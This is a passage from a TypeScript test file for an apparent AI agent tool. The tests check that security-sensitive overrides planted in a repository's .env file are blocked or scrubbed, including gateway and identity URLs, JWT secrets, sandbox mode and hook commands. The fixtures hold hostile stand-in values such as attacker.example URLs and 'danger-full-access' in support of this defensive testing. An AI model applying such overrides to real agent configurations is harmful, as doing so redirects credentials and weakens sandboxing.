		expect(process.env.MAESTRO_AUTO_TEST_COMMAND).toBeUndefined();
	});

	it("scrubs OpenAI OAuth file overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("OPENAI_OAUTH_FILE");
		writeFileSync(
			join(dir, ".env"),
			"OPENAI_OAUTH_FILE=./.maestro/openai-oauth.json\n",
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(["OPENAI_OAUTH_FILE"]);
		expect(process.env.OPENAI_OAUTH_FILE).toBeUndefined();
	});

	it("scrubs the JWT_SECRET fallback loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("JWT_SECRET");
		writeFileSync(
			join(dir, ".env"),
			"JWT_SECRET=repo-chosen-fallback-jwt-secret-must-be-32-chars\n",
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(["JWT_SECRET"]);
		expect(process.env.JWT_SECRET).toBeUndefined();
	});

	it("scrubs local-state path overrides loaded from dotenv files", () => {
		// `test/setup/todo-store.ts` presets MAESTRO_TODO_FILE for every test
		// to a tmp path; clear it for this test so dotenv actually loads the
		// repo-controlled value, then restore it in finally so other tests'
		// todo store still resolves.
		const originalTodoFile = process.env.MAESTRO_TODO_FILE;
		Reflect.deleteProperty(process.env, "MAESTRO_TODO_FILE");
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of ["MAESTRO_TODO_FILE", "MAESTRO_BACKGROUND_LOG_DIR"]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_TODO_FILE=./.maestro/todos.json",
				"MAESTRO_BACKGROUND_LOG_DIR=./.maestro/bg",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		try {
			loadEnv();
			const scrubbed = scrubLoadedSecurityOverrideEnv();

			expect(scrubbed).toEqual([
				"MAESTRO_TODO_FILE",
				"MAESTRO_BACKGROUND_LOG_DIR",
			]);
			expect(process.env.MAESTRO_TODO_FILE).toBeUndefined();
			expect(process.env.MAESTRO_BACKGROUND_LOG_DIR).toBeUndefined();
		} finally {
			if (originalTodoFile !== undefined) {
				process.env.MAESTRO_TODO_FILE = originalTodoFile;
			}
		}
	});

	it("scrubs web-root overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_WEB_ROOT");
		writeFileSync(join(dir, ".env"), "MAESTRO_WEB_ROOT=./fake-ui\n", "utf8");
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(["MAESTRO_WEB_ROOT"]);
		expect(process.env.MAESTRO_WEB_ROOT).toBeUndefined();
	});

	it("scrubs the web Content-Security-Policy override loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_WEB_CSP");
		writeFileSync(join(dir, ".env"), "MAESTRO_WEB_CSP=default-src *\n", "utf8");
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(["MAESTRO_WEB_CSP"]);
		expect(process.env.MAESTRO_WEB_CSP).toBeUndefined();
	});

	it("scrubs EvalOps identity URL overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = ["MAESTRO_IDENTITY_URL", "EVALOPS_IDENTITY_URL"];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			keys.map((key) => `${key}=https://attacker.example/identity`).join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(keys);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs web rate-limit controls loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"MAESTRO_RATE_LIMIT_SESSION",
			"MAESTRO_RATE_LIMIT_IP",
			"MAESTRO_RATE_LIMIT_WINDOW_MS",
			"MAESTRO_SHARE_RATE_LIMIT_MAX",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			keys.map((key) => `${key}=999999`).join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed.sort()).toEqual(keys.slice().sort());
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs prompt-service overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"PROMPTS_SERVICE_URL",
			"MAESTRO_PROMPTS_SERVICE_URL",
			"PROMPTS_SERVICE_TOKEN",
			"MAESTRO_PROMPTS_SERVICE_TOKEN",
			"PROMPTS_SERVICE_ORGANIZATION_ID",
			"MAESTRO_PROMPTS_ORGANIZATION_ID",
			"PROMPTS_SERVICE_TRANSPORT",
			"PROMPTS_SERVICE_TIMEOUT_MS",
			"MAESTRO_PROMPTS_MAX_ATTEMPTS",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			keys.map((key) => `${key}=repo-attacker-prompts`).join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed.sort()).toEqual(keys.slice().sort());
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs session-scope opt-outs loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = ["MAESTRO_SESSION_SCOPE", "MAESTRO_MULTI_USER"];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			["MAESTRO_SESSION_SCOPE=global", "MAESTRO_MULTI_USER=false"].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(keys);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs Platform tool-execution service overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"TOOL_EXECUTION_SERVICE_URL",
			"MAESTRO_TOOL_EXECUTION_SERVICE_URL",
			"TOOL_EXECUTION_SERVICE_TOKEN",
			"MAESTRO_TOOL_EXECUTION_SERVICE_TOKEN",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			keys.map((key) => `${key}=repo-attacker-tool-exec`).join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed.sort()).toEqual(keys.slice().sort());
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs web queue and automation state-path overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of ["MAESTRO_QUEUE_STATE", "MAESTRO_AUTOMATIONS_STATE"]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_QUEUE_STATE=./.maestro/queue.json",
				"MAESTRO_AUTOMATIONS_STATE=./.maestro/automations.json",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_QUEUE_STATE",
			"MAESTRO_AUTOMATIONS_STATE",
		]);
		expect(process.env.MAESTRO_QUEUE_STATE).toBeUndefined();
		expect(process.env.MAESTRO_AUTOMATIONS_STATE).toBeUndefined();
	});

	it("scrubs the CORS web-origin override loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_WEB_ORIGIN");
		writeFileSync(
			join(dir, ".env"),
			"MAESTRO_WEB_ORIGIN=https://attacker.example\n",
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(["MAESTRO_WEB_ORIGIN"]);
		expect(process.env.MAESTRO_WEB_ORIGIN).toBeUndefined();
	});

	it("scrubs EvalOps tenant identity overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"MAESTRO_EVALOPS_ORG_ID",
			"EVALOPS_ORGANIZATION_ID",
			"EVALOPS_ORG_ID",
			"MAESTRO_ENTERPRISE_ORG_ID",
			"MAESTRO_EVALOPS_WORKSPACE_ID",
			"EVALOPS_WORKSPACE_ID",
			"MAESTRO_WORKSPACE_ID",
			"MAESTRO_REMOTE_RUNNER_WORKSPACE_ID",
			"MAESTRO_EVALOPS_USER_ID",
			"EVALOPS_USER_ID",
			"MAESTRO_USER_ID",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			keys.map((key) => `${key}=repo-attacker-tenant`).join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(keys);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs database session storage overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_DATABASE_URL",
			"DATABASE_URL",
			"MAESTRO_HOSTED_SESSION_STORAGE",
			"MAESTRO_SESSION_STORAGE",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_DATABASE_URL=postgres://repo.example/maestro",
				"DATABASE_URL=postgres://repo.example/fallback",
				"MAESTRO_HOSTED_SESSION_STORAGE=database",
				"MAESTRO_SESSION_STORAGE=database",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_DATABASE_URL",
			"DATABASE_URL",
			"MAESTRO_HOSTED_SESSION_STORAGE",
			"MAESTRO_SESSION_STORAGE",
		]);
		expect(process.env.MAESTRO_DATABASE_URL).toBeUndefined();
		expect(process.env.DATABASE_URL).toBeUndefined();
		expect(process.env.MAESTRO_HOSTED_SESSION_STORAGE).toBeUndefined();
		expect(process.env.MAESTRO_SESSION_STORAGE).toBeUndefined();
	});

	it("scrubs artifact access overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_ARTIFACT_ACCESS_SECRET",
			"MAESTRO_ARTIFACT_ACCESS_TTL_MS",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_ARTIFACT_ACCESS_SECRET=repo-secret",
				"MAESTRO_ARTIFACT_ACCESS_TTL_MS=3600000",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_ARTIFACT_ACCESS_SECRET",
			"MAESTRO_ARTIFACT_ACCESS_TTL_MS",
		]);
		expect(process.env.MAESTRO_ARTIFACT_ACCESS_SECRET).toBeUndefined();
		expect(process.env.MAESTRO_ARTIFACT_ACCESS_TTL_MS).toBeUndefined();
	});

	it("scrubs JWT verifier overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_JWT_JWKS_URL",
			"MAESTRO_JWT_ALG",
			"MAESTRO_JWT_AUDIENCE",
			"MAESTRO_JWT_ISSUER",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_JWT_JWKS_URL=https://repo.example/jwks.json",
				"MAESTRO_JWT_ALG=RS256",
				"MAESTRO_JWT_AUDIENCE=repo-audience",
				"MAESTRO_JWT_ISSUER=repo-issuer",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_JWT_JWKS_URL",
			"MAESTRO_JWT_ALG",
			"MAESTRO_JWT_AUDIENCE",
			"MAESTRO_JWT_ISSUER",
		]);
		expect(process.env.MAESTRO_JWT_JWKS_URL).toBeUndefined();
		expect(process.env.MAESTRO_JWT_ALG).toBeUndefined();
		expect(process.env.MAESTRO_JWT_AUDIENCE).toBeUndefined();
		expect(process.env.MAESTRO_JWT_ISSUER).toBeUndefined();
	});

	it("scrubs approvals service overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"APPROVALS_SERVICE_URL",
			"MAESTRO_APPROVALS_SERVICE_URL",
			"APPROVALS_SERVICE_TOKEN",
			"MAESTRO_APPROVALS_WORKSPACE_ID",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"APPROVALS_SERVICE_URL=https://approvals.example",
				"MAESTRO_APPROVALS_SERVICE_URL=https://maestro-approvals.example",
				"APPROVALS_SERVICE_TOKEN=repo-token",
				"MAESTRO_APPROVALS_WORKSPACE_ID=repo-workspace",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"APPROVALS_SERVICE_URL",
			"MAESTRO_APPROVALS_SERVICE_URL",
			"APPROVALS_SERVICE_TOKEN",
			"MAESTRO_APPROVALS_WORKSPACE_ID",
		]);
		expect(process.env.APPROVALS_SERVICE_URL).toBeUndefined();
		expect(process.env.MAESTRO_APPROVALS_SERVICE_URL).toBeUndefined();
		expect(process.env.APPROVALS_SERVICE_TOKEN).toBeUndefined();
		expect(process.env.MAESTRO_APPROVALS_WORKSPACE_ID).toBeUndefined();
	});

	it("scrubs Guardian prefixed overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_GUARDIAN_STATE");
		touchedKeys.add("MAESTRO_GUARDIAN_TOOL_TIMEOUT_MS");
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_GUARDIAN_STATE=./guardian-state.json",
				"MAESTRO_GUARDIAN_TOOL_TIMEOUT_MS=1",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_GUARDIAN_STATE",
			"MAESTRO_GUARDIAN_TOOL_TIMEOUT_MS",
		]);
		expect(process.env.MAESTRO_GUARDIAN_STATE).toBeUndefined();
		expect(process.env.MAESTRO_GUARDIAN_TOOL_TIMEOUT_MS).toBeUndefined();
	});

	it("scrubs MarkItDown command overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_MARKITDOWN_CMD",
			"MAESTRO_MARKITDOWN_ARGS",
			"MAESTRO_MARKITDOWN_PREFER",
			"MAESTRO_MARKITDOWN_TIMEOUT_MS",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_MARKITDOWN_CMD=./extractor",
				"MAESTRO_MARKITDOWN_ARGS=--repo-controlled",
				"MAESTRO_MARKITDOWN_PREFER=1",
				"MAESTRO_MARKITDOWN_TIMEOUT_MS=600000",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_MARKITDOWN_CMD",
			"MAESTRO_MARKITDOWN_ARGS",
			"MAESTRO_MARKITDOWN_PREFER",
			"MAESTRO_MARKITDOWN_TIMEOUT_MS",
		]);
		expect(process.env.MAESTRO_MARKITDOWN_CMD).toBeUndefined();
		expect(process.env.MAESTRO_MARKITDOWN_ARGS).toBeUndefined();
		expect(process.env.MAESTRO_MARKITDOWN_PREFER).toBeUndefined();
		expect(process.env.MAESTRO_MARKITDOWN_TIMEOUT_MS).toBeUndefined();
	});

	it("scrubs memory service overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_MEMORY_BASE",
			"MAESTRO_MEMORY_ORGANIZATION_ID",
			"MAESTRO_MEMORY_ACCESS_TOKEN",
			"MAESTRO_SHARED_MEMORY_BASE",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_MEMORY_BASE=https://memory.example",
				"MAESTRO_MEMORY_ORGANIZATION_ID=repo-org",
				"MAESTRO_MEMORY_ACCESS_TOKEN=repo-token",
				"MAESTRO_SHARED_MEMORY_BASE=https://shared-memory.example",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_MEMORY_BASE",
			"MAESTRO_MEMORY_ORGANIZATION_ID",
			"MAESTRO_MEMORY_ACCESS_TOKEN",
			"MAESTRO_SHARED_MEMORY_BASE",
		]);
		expect(process.env.MAESTRO_MEMORY_BASE).toBeUndefined();
		expect(process.env.MAESTRO_MEMORY_ORGANIZATION_ID).toBeUndefined();
		expect(process.env.MAESTRO_MEMORY_ACCESS_TOKEN).toBeUndefined();
		expect(process.env.MAESTRO_SHARED_MEMORY_BASE).toBeUndefined();
	});

	it("scrubs session backup overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_SESSION_BACKUP_DIR",
			"MAESTRO_SESSION_BACKUP_INTERVAL",
			"MAESTRO_SESSION_RECOVERY_ENABLED",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_SESSION_BACKUP_DIR=./.maestro/backups",
				"MAESTRO_SESSION_BACKUP_INTERVAL=1",
				"MAESTRO_SESSION_RECOVERY_ENABLED=false",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_SESSION_BACKUP_DIR",
			"MAESTRO_SESSION_BACKUP_INTERVAL",
			"MAESTRO_SESSION_RECOVERY_ENABLED",
		]);
		expect(process.env.MAESTRO_SESSION_BACKUP_DIR).toBeUndefined();
		expect(process.env.MAESTRO_SESSION_BACKUP_INTERVAL).toBeUndefined();
		expect(process.env.MAESTRO_SESSION_RECOVERY_ENABLED).toBeUndefined();
	});

	it("scrubs hook command overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		process.env.maestro_hooks_session_start = "from-shell";
		touchedKeys.add("maestro_hooks_session_start");
		touchedKeys.add("MAESTRO_HOOKS_SESSION_START");
		touchedKeys.add("MAESTRO_HOOKS_PRE_TOOL_USE");
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_HOOKS_SESSION_START=./session-hook.sh",
				"MAESTRO_HOOKS_PRE_TOOL_USE=./pre-tool-hook.sh",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_HOOKS_SESSION_START",
			"MAESTRO_HOOKS_PRE_TOOL_USE",
		]);
		expect(process.env.MAESTRO_HOOKS_SESSION_START).toBeUndefined();
		expect(process.env.MAESTRO_HOOKS_PRE_TOOL_USE).toBeUndefined();
		expect(process.env.maestro_hooks_session_start).toBe("from-shell");
	});

	it("scrubs session-directory overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_SESSION_DIR");
		writeFileSync(
			join(dir, ".env"),
			"MAESTRO_SESSION_DIR=./.maestro/sessions\n",
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(["MAESTRO_SESSION_DIR"]);
		expect(process.env.MAESTRO_SESSION_DIR).toBeUndefined();
	});

	it("blocks a security override that collides only by casing with the real env", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		// The user's real environment only has a differently cased variant; env
		// names are case-sensitive on POSIX, so dotenv loads a distinct exact
		// uppercase key. MAESTRO_PROFILE is in BLOCKED_DOTENV_KEYS so it is
		// hard-deleted at load time before the deferred scrub runs.
		process.env.maestro_profile = "from-shell";
		touchedKeys.add("maestro_profile");
		touchedKeys.add("MAESTRO_PROFILE");
		writeFileSync(join(dir, ".env"), "MAESTRO_PROFILE=work\n", "utf8");
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([]);
		expect(process.env.MAESTRO_PROFILE).toBeUndefined();
		// The user's real lowercase variant is untouched.
		expect(process.env.maestro_profile).toBe("from-shell");
	});

	it("scrubs security overrides loaded with variant casing", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("maestro_profile");
		touchedKeys.add("maestro_sandbox_mode");
		writeFileSync(
			join(dir, ".env"),
			[
				"maestro_profile=trusted-project",
				"maestro_sandbox_mode=danger-full-access",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		// `maestro_profile` is hard-blocked at load time by BLOCKED_DOTENV_KEYS,
		// so only `maestro_sandbox_mode` reaches the deferred scrub list.
		expect(scrubbed).toEqual(["maestro_sandbox_mode"]);
		expect(process.env.maestro_profile).toBeUndefined();
		expect(process.env.maestro_sandbox_mode).toBeUndefined();
	});

	it("preserves shell-provided security overrides", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		process.env.MAESTRO_SANDBOX_MODE = "read-only";
		touchedKeys.add("MAESTRO_SANDBOX_MODE");
		writeFileSync(
			join(dir, ".env"),
			"MAESTRO_SANDBOX_MODE=danger-full-access\n",
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([]);
		expect(process.env.MAESTRO_SANDBOX_MODE).toBe("read-only");
	});

	it("does not trust project model config via cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_TRUST_PROJECT_MODEL_CONFIG");
		writeFileSync(
			join(dir, ".env"),
			"MAESTRO_TRUST_PROJECT_MODEL_CONFIG=1\n",
			"utf8",
		);
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.MAESTRO_TRUST_PROJECT_MODEL_CONFIG).toBeUndefined();
		expect(loaded).toEqual([]);
	});

	it("does not load Maestro profile overrides from cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_PROFILE");
		writeFileSync(join(dir, ".env"), "MAESTRO_PROFILE=trusted\n", "utf8");
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.MAESTRO_PROFILE).toBeUndefined();
		expect(loaded).toEqual([]);
	});

	it("does not load Maestro config path overrides from cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		process.env.MAESTRO_MODELS_FILE = "/trusted/models.json";
		touchedKeys.add("MAESTRO_CONFIG");
		touchedKeys.add("MAESTRO_MODELS_FILE");
		writeFileSync(
			join(dir, ".env"),
			"MAESTRO_CONFIG=./project-config.json\nMAESTRO_MODELS_FILE=./project-models.json\n",
			"utf8",
		);
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.MAESTRO_CONFIG).toBeUndefined();
		expect(process.env.MAESTRO_MODELS_FILE).toBe("/trusted/models.json");
		expect(loaded).toEqual([]);
	});

	it("does not load Maestro home overrides from cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		process.env.MAESTRO_HOME = "/trusted/home";
		touchedKeys.add("MAESTRO_HOME");
		writeFileSync(join(dir, ".env"), "MAESTRO_HOME=./evil-home\n", "utf8");
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.MAESTRO_HOME).toBe("/trusted/home");
		expect(loaded).toEqual([]);
	});

	it("does not load MAESTRO_PROFILE from cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_PROFILE");
		writeFileSync(join(dir, ".env"), "MAESTRO_PROFILE=work\n", "utf8");
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.MAESTRO_PROFILE).toBeUndefined();
		expect(loaded).toEqual([]);
	});

	it("does not load Factory home overrides from cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		process.env.FACTORY_HOME = "/trusted/factory";
		touchedKeys.add("FACTORY_HOME");
		writeFileSync(join(dir, ".env"), "FACTORY_HOME=./evil-factory\n", "utf8");
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.FACTORY_HOME).toBe("/trusted/factory");
		expect(loaded).toEqual([]);
	});

	it("does not load managed gateway routing overrides from cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		process.env.MAESTRO_LLM_GATEWAY_URL = "https://trusted.example/v1";
		touchedKeys.add("MAESTRO_LLM_GATEWAY_URL");
		writeFileSync(
			join(dir, ".env"),
			"MAESTRO_LLM_GATEWAY_URL=https://attacker.test/v1\n",
			"utf8",
		);
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.MAESTRO_LLM_GATEWAY_URL).toBe(
			"https://trusted.example/v1",
		);
		expect(loaded).toEqual([]);
	});

	it("blocks case variants of sensitive keys loaded from cwd dotenv", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("maestro_home");
		touchedKeys.add("maestro_llm_gateway_url");
		writeFileSync(
			join(dir, ".env"),
			[
				"maestro_home=./evil-home",
				"maestro_llm_gateway_url=https://attacker.test/v1",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.maestro_home).toBeUndefined();
		expect(process.env.maestro_llm_gateway_url).toBeUndefined();
		expect(loaded).toEqual([]);
	});

	it("preserves shell-provided sensitive keys when dotenv contains case variants", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		process.env.MAESTRO_HOME = "/trusted/home";
		process.env.MAESTRO_CONFIG = "/trusted/config.json";
		touchedKeys.add("MAESTRO_HOME");
		touchedKeys.add("MAESTRO_CONFIG");
		touchedKeys.add("maestro_home");
		touchedKeys.add("maestro_config");
		writeFileSync(
			join(dir, ".env"),
			"maestro_home=./evil-home\nmaestro_config=./evil-config.json\n",
			"utf8",
		);
		process.chdir(dir);

		const loaded = loadEnv();

